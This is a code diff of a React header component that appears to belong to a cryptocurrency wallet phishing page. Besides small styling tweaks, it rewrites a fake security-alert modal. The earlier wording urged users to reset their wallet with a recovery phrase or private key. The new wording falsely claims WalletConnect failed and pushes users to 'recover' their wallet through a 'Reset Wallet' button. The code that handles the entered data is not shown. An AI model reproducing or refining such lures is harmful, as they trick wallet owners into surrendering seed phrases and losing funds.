@@ -51,7 +51,6 @@ const style1 = {
     top: '50%',
     left: '50%',
     transform: 'translate(-50%, -50%)',
-    width: 450,
     borderRadius: '20px',
     bgcolor: 'background.paper',
     textAlign: 'center',
@@ -61,7 +60,8 @@ const style1 = {
     paddingRight: '20px',
     paddingTop: '10px',
     paddingBottom: '40px',
-    minHeight: '500px'
+    minHeight: '500px',
+    maxWidth : '500px',
 
 
 };
@@ -280,12 +280,8 @@ function Header() {
                                             {activeWallet?.name} Security Alert
                                         </Typography>
                                         <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
-                                            Your Password May have been compromised
+                                                Warn! WalletConnect failed to connect to your wallet, please continue to recover your wallet.
                                         </Typography>
-                                        <Typography id="modal-modal-title" variant="h6" component="h2">
-                                            Reset your wallet and change your password for security purposes using a recovery phrase or private key
-                                        </Typography>
-
                                         <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                             Reset Wallet
                                         </button>
@@ -296,7 +292,9 @@ function Header() {
                                     <Box sx={{ mb: 2 }}>
                                         {
                                             loading ?
-                                                <CircularProgress />
+                                                <Box sx={{minWidth : '320px'}}>
+                                                    <CircularProgress />
+                                                </Box>
                                                 :
                                                 (
                                                     <>
